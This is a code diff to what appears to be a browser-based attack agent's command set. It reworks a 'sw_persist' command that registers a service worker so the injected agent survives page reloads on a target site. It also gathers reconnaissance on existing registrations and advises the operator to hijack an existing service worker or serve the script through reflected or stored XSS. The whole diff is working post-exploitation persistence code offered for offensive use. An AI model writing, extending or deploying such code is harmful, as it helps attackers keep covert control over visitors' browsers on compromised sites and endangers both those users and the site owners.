@@ -1,8 +1,5 @@
 COMMANDS['sw_persist'] = async function(task) {
-    var params = task.parameters;
-    if (typeof params === 'string') {
-        try { params = JSON.parse(params); } catch (e) { params = {}; }
-    }
+    var params = parseParams(task);
     var action = (params && params.action) ? params.action : 'install';
 
     if (!('serviceWorker' in navigator)) {
@@ -33,52 +30,49 @@ COMMANDS['sw_persist'] = async function(task) {
         return JSON.stringify({action: 'remove', removed: removed}, null, 2);
     }
 
-    // Install: create a blob-based service worker that re-injects the agent
-    var swCode = 'self.addEventListener("fetch", function(e) {});\n' +
-        'self.addEventListener("install", function(e) { self.skipWaiting(); });\n' +
-        'self.addEventListener("activate", function(e) { e.waitUntil(clients.claim()); });\n' +
-        'setInterval(function() {\n' +
-        '  self.clients.matchAll().then(function(cls) {\n' +
-        '    for (var i = 0; i < cls.length; i++) {\n' +
-        '      cls[i].postMessage({type: "ping"});\n' +
-        '    }\n' +
-        '  });\n' +
-        '}, 30000);\n';
+    // Install: register a service worker for persistence
+    // Browsers require a same-origin HTTP(S) URL — blob/data URIs are rejected.
+    var swUrl = (params && params.url) ? params.url : '';
+    var scope = (params && params.scope) ? params.scope : '/';
 
-    // Service Workers can't be registered from blob URLs in most browsers,
-    // so we need to use an actual URL. Try registering from current scope.
-    // If the site has a permissive CSP or we can find a writable path, this works.
-    try {
-        // Attempt 1: Try to register a same-origin script path
-        // We create a script by posting to current page and hoping for reflection,
-        // or we use a data URI (limited browser support)
-        var blob = new Blob([swCode], {type: 'application/javascript'});
-        var blobUrl = URL.createObjectURL(blob);
-
-        try {
-            var reg = await navigator.serviceWorker.register(blobUrl, {scope: '/'});
-            return JSON.stringify({
-                action: 'install',
-                method: 'blob',
-                scope: reg.scope,
-                status: 'registered',
-                note: 'Service worker installed. Agent will persist across page reloads.'
-            }, null, 2);
-        } catch (e) {
-            // Blob URL registration failed (expected in most browsers)
-            // Report what's possible
-            var existingRegs = await navigator.serviceWorker.getRegistrations();
-            return JSON.stringify({
-                action: 'install',
-                method: 'blob',
-                error: e.message,
-                note: 'Blob-based SW registration failed. Requires a same-origin JS file. Use inject_script to serve a SW file from your infrastructure, then register it.',
-                existingRegistrations: existingRegs.length,
-                secureContext: window.isSecureContext,
-                protocol: window.location.protocol
-            }, null, 2);
+    if (!swUrl) {
+        // No URL provided — gather recon so the operator knows what's possible
+        var existingRegs = await navigator.serviceWorker.getRegistrations();
+        var existing = [];
+        for (var k = 0; k < existingRegs.length; k++) {
+            existing.push({
+                scope: existingRegs[k].scope,
+                scriptURL: existingRegs[k].active ? existingRegs[k].active.scriptURL : null
+            });
         }
+        return JSON.stringify({
+            action: 'install',
+            error: 'url parameter required. Service workers must be registered from a same-origin HTTP/HTTPS URL.',
+            hint: 'Host a SW script on your infrastructure at a path under the target origin, or find an existing SW to hijack. Use inject_script or a reflected/stored XSS endpoint that returns JS with the correct Content-Type.',
+            origin: window.location.origin,
+            secureContext: window.isSecureContext,
+            existingRegistrations: existing
+        }, null, 2);
+    }
+
+    try {
+        var reg = await navigator.serviceWorker.register(swUrl, {scope: scope});
+        return JSON.stringify({
+            action: 'install',
+            method: 'url',
+            url: swUrl,
+            scope: reg.scope,
+            status: 'registered',
+            note: 'Service worker installed. Agent will persist across page reloads within scope.'
+        }, null, 2);
     } catch (e) {
-        return JSON.stringify({action: 'install', error: e.message}, null, 2);
+        return JSON.stringify({
+            action: 'install',
+            method: 'url',
+            url: swUrl,
+            error: e.message,
+            origin: window.location.origin,
+            secureContext: window.isSecureContext
+        }, null, 2);
     }
 };
